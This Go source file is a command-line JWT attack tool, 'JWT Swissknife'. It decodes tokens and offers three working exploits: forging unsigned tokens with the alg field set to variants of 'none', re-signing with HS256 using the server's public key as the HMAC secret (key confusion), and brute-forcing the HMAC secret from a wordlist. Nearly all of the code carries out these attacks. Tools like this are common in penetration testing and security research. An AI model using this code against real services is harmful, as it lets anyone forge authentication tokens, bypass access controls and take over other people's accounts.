package main

import(
	"fmt"
	"encoding/base64"
	"encoding/json"
	"strings"
	"os"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"bufio"
	"hash"
	"io/ioutil"
	"flag"
)


var jwt *string
var header string
var payload string
var headerStruct map[string]interface{}

var usage = "usage : " + os.Args[0] + " [-h] -x exploit -jwt token [-pk public key file] [-w wordlist file]\n"

func base64urlDecode(toDecode string) string {
		result, err := base64.RawURLEncoding.DecodeString(toDecode)
		if err != nil {
			error("invalid token")
		}
		return string(result)
}

func base64urlEncode(toEncode string) string {
		result := base64.RawURLEncoding.EncodeToString([]byte(toEncode))
		return string(result)
}


func checkToken(jwt string) bool {
	if len(strings.Split(jwt, ".")) != 3 && len(strings.Split(jwt, ".")) != 2 {
		return false
	}
	return true
}

func parseToken(jwt string, headerStruct *map[string]interface{}) {
	parts := strings.Split(jwt, ".")
	header = parts[0]
	payload = parts[1]
	json.Unmarshal([]byte(base64urlDecode(parts[0])), headerStruct)
}

func createSignature(token, secretKey, hashAlg string) string {
	var mac hash.Hash
	if hashAlg == "HS256" {
		mac = hmac.New(sha256.New, []byte(secretKey))
	} else if hashAlg == "HS384" {
		mac = hmac.New(sha512.New384, []byte(secretKey))
	} else if hashAlg == "HS512" {
		mac = hmac.New(sha512.New, []byte(secretKey))
	} else {
		error("invalid hash")
	}
	mac.Write([]byte(token))
	signature := base64.URLEncoding.EncodeToString(mac.Sum(nil))
	signature = strings.Replace(signature, "=", "", -1)
	return signature
}

func createToken(b64head, b64payload, secretKey, alg string) string {
	token := b64head + "." + b64payload
	token = token + "." + createSignature(token, secretKey, alg)
	return token
}

func readToken(token string) {
	var headStruct map[string]interface{}
	var payloadStruct map[string]interface{}

	json.Unmarshal([]byte(base64urlDecode(strings.Split(token, ".")[0])), &headStruct)
	json.Unmarshal([]byte(base64urlDecode(strings.Split(token, ".")[1])), &payloadStruct)
	fmt.Println("[*] header content :")
	for key, value := range headStruct {
		fmt.Println("\t",key," : ",value)
	}
	fmt.Println("\n[*] payload content :")
	for key, value := range payloadStruct {
		fmt.Println("\t",key," : ",value)
	}
}


func error(reason string) {
	if reason == "invalid token" {
		fmt.Println("[ERROR] invalid token.")
	}
	if reason == "open file error" {
		fmt.Println("[ERROR] can't open this file.")
	}
	if reason == "invalid hash" {
		fmt.Println("[ERROR] invalid hash")
	}
	if reason == "invalid exploit choice" {
		fmt.Println("[ERROR] invalid exploit choice")
	}
	os.Exit(1)
}

func showUsage() {
	fmt.Printf("%s", usage)
	os.Exit(1)
}

func begin() {
	logo := `
     ██╗██╗    ██╗████████╗  ███████╗██╗    ██╗██╗███████╗███████╗██╗  ██╗███╗   ██╗██╗███████╗███████╗
     ██║██║    ██║╚══██╔══╝  ██╔════╝██║    ██║██║██╔════╝██╔════╝██║ ██╔╝████╗  ██║██║██╔════╝██╔════╝
     ██║██║ █╗ ██║   ██║     ███████╗██║ █╗ ██║██║███████╗███████╗█████╔╝ ██╔██╗ ██║██║█████╗  █████╗  
██   ██║██║███╗██║   ██║     ╚════██║██║███╗██║██║╚════██║╚════██║██╔═██╗ ██║╚██╗██║██║██╔══╝  ██╔══╝  
╚█████╔╝╚███╔███╔╝   ██║     ███████║╚███╔███╔╝██║███████║███████║██║  ██╗██║ ╚████║██║██║     ███████╗
 ╚════╝  ╚══╝╚══╝    ╚═╝     ╚══════╝ ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝

`
	fmt.Printf("%s", logo)
}

func bruteForce(token, wordlist, alg string) {
	tokenParts := strings.Split(token, ".")
	file, err := os.Open(wordlist)
	if err != nil {
		error("open file error")
	}
	fileScanner := bufio.NewScanner(file)
	fileScanner.Split(bufio.ScanLines)
	for fileScanner.Scan() {
		if createToken(tokenParts[0], tokenParts[1], string(fileScanner.Text()), alg) == *jwt {
			fmt.Printf("secret key cracked !\nsecret key : %s\n", string(fileScanner.Text()))
			return
		}
	}
	fmt.Printf("can't crack this token ...\n")
}


func pubKeyExploit(pubKeyFile string) {
    dataFile, err := ioutil.ReadFile(pubKeyFile)
    if err != nil {
    	error("open file error")
    }
    pubKey := string(dataFile)
	headerStruct["alg"] = "HS256"
	data, _ := json.Marshal(headerStruct)
	newHead := base64urlEncode(string(data))
	newTok := createToken(newHead, payload, pubKey, headerStruct["alg"].(string))
	fmt.Printf("[+] alg : HS256 \n[+] secret key : content of %s\n[+] token : %s\n\n",pubKeyFile , newTok) 
}


func noneExploit(jwt string) {
	var headParse map[string]interface{}
	parseToken(jwt, &headParse)
	algo := []string{"None", "none", "NONE", "nOne"}
	for _, i := range algo {
		headParse["alg"] = i
		data, _ := json.Marshal(headParse)
		newTok := base64urlEncode(string(data)) + "." + strings.Split(jwt, ".")[1] 
		fmt.Printf("[+] alg : %s\n[+] jwt : %s\n\n", i, newTok)
	}
}


func main() {
	jwt = flag.String("jwt", "", "json web token")
	exploit := flag.String("x", "", "exploit :\n\tn  =>  alg : none\n\ta  =>  key confusion  [-pk public key file]\n\tb  =>  brute force [-w wordlist path]")
	pubKeyFile := flag.String("pk", "", "public key file")
	wordlist := flag.String("w", "", "wordlist file")
	flag.Parse()

	if *exploit == "" && *pubKeyFile == "" && *wordlist == "" && *jwt == "" && len(os.Args) == 2 {
			begin()
			jwt = &os.Args[1]
			if checkToken(*jwt) == false {
				error("invalid token")
			}
			readToken(*jwt)
	} else if *exploit != "" && *jwt != "" {
		if checkToken(*jwt) == false {
			error("invalid token")
		}
		parseToken(*jwt, &headerStruct)
		begin()
		switch *exploit {
		case "n":
			noneExploit(*jwt)
		case "a":
			if *pubKeyFile == "" {
				showUsage()
			}
			pubKeyExploit(*pubKeyFile)
		case "b":
			if *wordlist == "" {
				showUsage()
			}
			bruteForce(*jwt, *wordlist, headerStruct["alg"].(string))
		default:
			error("invalid exploit choice")
		}

	} else {
		showUsage()
	}
}